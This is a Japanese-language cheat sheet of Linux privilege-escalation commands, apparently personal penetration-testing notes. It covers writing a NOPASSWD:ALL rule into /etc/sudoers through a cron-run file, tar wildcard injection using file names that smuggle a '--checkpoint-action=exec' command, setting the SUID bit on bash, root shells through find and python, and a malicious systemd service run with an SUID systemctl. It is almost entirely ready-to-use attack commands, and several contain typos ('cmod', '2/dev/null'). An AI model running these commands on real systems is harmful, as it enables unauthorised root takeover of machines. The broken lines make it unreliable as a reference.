# WildCard Injection

## sudoers

``` shell
    echo 'echo "vuln ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' > <cronに使用されているファイル>
```

## wiledcard injection

``` shell
    #tar .... /*を利用
    #tarの圧縮ディレクトリで実行
    echo '#!/bin/bash\ncmod +s /bin/bash' > shell.sh
    #または
    echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > shell.sh
    #もしくはこれでもいい。
    echo 'echo "kali ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > shell.sh
    # exec=のあとに任意のコマンドを実行できる
    echo "" > "--checkpoint-action=exec= sh shell.sh"
    echo "" > --checkpoint=1
    # 攻撃側の端末で実行するとrootが取れる
    /bin/bash -p
```

## findで権限昇格

``` shell
    find / -type f -perm -u=s 2/dev/null

    find . -exec /bin/bash -p \; -quit
```

## pythonで権限昇格

``` shell
    python -c 'import os;os.system("/bin/sh -p")'
```

## SUID

``` shell
    #install -mでモード指定
    sudo install -m =xs $(which systemctl) .
    #serviceの作成
    TF=$(mktemp).service
    echo '[Service]
    Type=oneshot
    ExecStart=/bin/sh -c "id > /tmp/output"
    [Install]
    WantedBy=multi-user.target' > $TF
    #リンクの生成
    ./systemctl link $TF
    #サービスの有効化
    ./systemctl enable --now $TF
```
